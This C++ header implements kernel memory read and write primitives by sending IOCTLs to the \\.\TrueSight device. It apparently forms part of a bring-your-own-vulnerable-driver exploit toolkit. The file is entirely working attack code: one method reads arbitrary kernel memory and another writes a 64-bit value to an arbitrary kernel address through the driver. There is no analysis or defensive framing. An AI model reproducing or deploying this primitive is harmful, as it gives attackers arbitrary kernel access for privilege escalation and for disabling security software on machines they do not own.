#pragma once

#include "KernelReadWrite.h"
#include "Utils.h"

class TrueSightRw : public IKernelReadWrite {
public:
	TrueSightRw() : m_Handle(0) {
		m_Handle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (m_Handle == INVALID_HANDLE_VALUE) {
			RaiseError("CreateFileA");
		}
	}

	std::vector<BYTE> ReadBuffer(PVOID Address, ULONG Size) override {
		constexpr ULONG MemoryReadIoctl = 0x22E050;

		struct {
			PVOID TargetAddress;
			ULONG OutputLength;
		} memoryReadParameters = { Address, Size };

		static_assert(sizeof(memoryReadParameters) == 0x10, "Incorrect size of read parameters");

		auto* outputBuffer = new BYTE[Size];

		if (!DeviceIoControl(m_Handle, MemoryReadIoctl, &memoryReadParameters, sizeof(memoryReadParameters), outputBuffer, Size, nullptr, nullptr)) {
			RaiseError("DeviceIoControl(MemoryReadIoctl) Failed");
		}

		std::vector<BYTE> result(outputBuffer, outputBuffer + Size);
		return result;
	}

	Qword ReadQword(PVOID Address) {
		std::vector<BYTE> buffer = this->ReadBuffer(Address, sizeof(Qword));
		auto result = *reinterpret_cast<Qword*>(buffer.data());
		return result;
	}

	void WriteQword(PVOID Address, Qword Value) {
		constexpr ULONG MemoryWriteIoctl = 0x22E014;

		//
		// Paramters for MemoryWriteIoctl.
		//
		struct {
			PVOID TargetAddress;
			ULONG Zero;
			Qword Value;
		} memoryWriteParamters = { (PBYTE)Address - 8 * 14, 0, Value };

		static_assert(sizeof(memoryWriteParamters) == 0x18, "Incorrect size of write parameters");

		if (!DeviceIoControl(m_Handle, MemoryWriteIoctl, &memoryWriteParamters, sizeof(memoryWriteParamters), nullptr, 0, nullptr, nullptr)) {
			RaiseError("DeviceIoControl(MemoryWriteIoctl) Failed");
		}
	}

	~TrueSightRw() {
		if (m_Handle != INVALID_HANDLE_VALUE) {
			CloseHandle(m_Handle);
		}
	}

private:
	HANDLE m_Handle;
};